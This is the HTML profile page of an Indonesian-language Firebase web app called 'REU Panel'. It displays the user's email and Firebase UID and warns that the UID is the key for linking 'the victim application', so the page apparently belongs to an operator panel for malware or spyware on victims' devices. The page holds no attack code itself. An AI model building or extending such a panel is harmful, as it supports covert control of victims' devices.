<!-- PATH: /profile.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Profile - REU Panel</title>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="navbar">
        <h2>REU Panel</h2>
        <div>
            <a href="dashboard.html">Dashboard</a>
            <a href="profile.html">Profile</a>
            <button onclick="logout()">Logout</button>
        </div>
    </div>

    <div class="container">
        <h1>Profile Saya</h1>
        <div id="profile-info">Loading...</div>
    </div>

    <script src="firebase-config.js"></script>
    <script>
        auth.onAuthStateChanged(user => {
            if (!user) window.location.href = 'index.html';
            else {
                document.getElementById('profile-info').innerHTML = `
                    <p><strong>Email:</strong> ${user.email}</p>
                    <p><strong>UID Firebase:</strong> ${user.uid} <button onclick="copyUID()">Copy</button></p>
                    <p><strong>Email Terverifikasi:</strong> ${user.emailVerified ? 'Ya' : 'Tidak'}</p>
                    <hr>
                    <h3>⚠️ Simpan baik-baik UID lo. Itu adalah kunci utama buat nyambungin aplikasi victim.</h3>
                `;
            }
        });

        function logout() { auth.signOut().then(() => window.location.href = 'index.html'); }
        function copyUID() { navigator.clipboard.writeText(auth.currentUser.uid); alert('UID dicopy!'); }
    </script>
</body>
</html>
